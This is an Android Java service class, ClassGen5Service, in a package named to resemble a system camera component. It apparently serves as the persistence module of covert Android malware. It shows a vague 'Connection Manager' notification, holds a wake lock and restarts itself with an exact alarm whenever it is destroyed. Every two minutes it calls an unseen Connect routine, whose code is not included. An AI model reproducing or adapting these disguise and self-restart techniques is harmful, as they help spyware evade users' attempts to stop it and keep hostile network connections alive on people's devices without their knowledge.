package com.android.photo.camera.capture;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.util.Log;

public class ClassGen5Service extends Service implements MonitoringRunnable.ServiceMonitor {
    private static final String TAG = "ClassGen5Service";
    private PowerManager.WakeLock wakeLock;
    private Handler handler;
    private static final long CHECK_INTERVAL = 120 * 1000; // 2 minutes
    private static final long RESTART_INTERVAL = 10 * 1000; // 10 seconds
    private boolean isDestroyed = false;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "ClassGen5Service created");

        // Start in foreground with notification
        ForegroundServiceHelper.startForeground(this, 1004,
                "Connection Manager", "Maintaining network connectivity");

        handler = new Handler(Looper.getMainLooper());
        acquireWakeLock();
        startConnectionMonitoring();
    }

    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "ClassGen5Service::WakeLockTag"
            );
            wakeLock.acquire(30 * 60 * 1000L); // 30 minutes timeout
        } catch (Exception e) {
            Log.e(TAG, "Error acquiring wake lock", e);
        }
    }

    private void startConnectionMonitoring() {
        handler.postDelayed(new MonitoringRunnable(this, handler, CHECK_INTERVAL), CHECK_INTERVAL);
    }

    @Override
    public boolean isDestroyed() {
        return isDestroyed;
    }

    @Override
    public void performMonitoringTask() {
        ensureConnection();
    }

    private void ensureConnection() {
        Log.d(TAG, "Checking connection...");
        Connect.startAsync(getApplicationContext());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "ClassGen5Service started");

        // Ensure we're running in foreground if restarted
        ForegroundServiceHelper.startForeground(this, 1004,
                "Connection Manager", "Maintaining network connectivity");

        ensureConnection();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "ClassGen5Service destroyed");
        isDestroyed = true;
        if (wakeLock != null && wakeLock.isHeld()) {
            try {
                wakeLock.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing wake lock", e);
            }
        }
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
        scheduleRestart();
    }

    private void scheduleRestart() {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent(this, ClassGen5Service.class);
            int flags = PendingIntent.FLAG_ONE_SHOT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }
            PendingIntent pendingIntent = PendingIntent.getService(
                    this,
                    1002,
                    intent,
                    flags
            );
            if (alarmManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setExactAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP,
                            SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                            pendingIntent
                    );
                } else {
                    alarmManager.setExact(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP,
                            SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                            pendingIntent
                    );
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling restart", e);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}